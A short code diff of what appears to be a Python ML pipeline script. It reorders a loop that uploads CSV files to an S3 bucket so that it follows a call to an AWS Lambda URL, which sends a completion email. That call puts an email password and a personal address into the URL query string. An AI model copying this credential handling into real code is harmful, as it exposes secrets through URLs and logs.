@@ -32,10 +32,8 @@ os.system("python ./test_code_crossvalidation_splits.py")
 # nohup bash test_code_quick.bash 0 &> model_training_output_colab_direct_challenge.txt
 s3 = boto3.client("s3",  aws_access_key_id=ACCESS_KEY, aws_secret_access_key=SECRET_KEY)
 lines = []
-for filepath in glob.glob("../*.csv"):
-    response = s3.upload_file(filepath, "1hh-algorithm-dev", "models/" + str(uuid.uuid4()) + "_" + os.path.basename(filepath))
-
-
 text = "\n".join(lines)
 import urllib
 urllib.request.urlopen("https://vorkqcranza3s6f66wloniatvy0duufg.lambda-url.us-east-1.on.aws/?destiny=matheus.ld.araujo@gmail.com&text=DoneLambda&password={}&subject=DoneLambda".format(email_password))
+for filepath in glob.glob("../*.csv"):
+    response = s3.upload_file(filepath, "1hh-algorithm-dev", "models/" + str(uuid.uuid4()) + "_" + os.path.basename(filepath))
